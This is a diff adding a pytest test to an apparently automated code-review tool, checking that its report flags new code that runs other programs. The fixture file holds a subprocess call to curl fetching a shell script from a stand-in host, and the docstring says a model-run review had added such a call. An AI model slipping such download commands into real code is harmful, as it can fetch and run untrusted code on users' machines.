@@ -271,3 +271,13 @@ def test_file_facts_an_added_python_file_and_a_changed_binary(tmp_path):
     files = [{"filename": "new.py", "status": "added"}, {"filename": "logo.png", "status": "modified", "binary": True}]
     facts = local.file_facts(str(tmp_path), "HEAD~1", "HEAD", files)
     assert list(facts) == ["logo.png"] and "name says png" in facts["logo.png"]
+
+
+def test_new_code_that_runs_a_program_is_in_the_also_checked_line_as_on_the_card(repo):
+    """A model-run review (blind round 9) added subprocess.run(["curl", ...]) and saw only 'could not place' locally."""
+    (repo / "app.py").write_text('import subprocess\nprint(1)\nsubprocess.run(["curl", "http://x.example/a.sh"])\n')
+    git(repo, "add", ".")
+    git(repo, "commit", "-qm", "more")
+    text = run("--repo", str(repo), "--issue-text", "Print 2 in app.py")[1]
+    assert "Also checked, with no model:" in text and "`app.py` line 3 now runs other programs" in text
+    assert "Also checked" not in run("--repo", str(repo), "--issue-text", "x", "--base", "HEAD~1", "--head", "HEAD~1")[1]
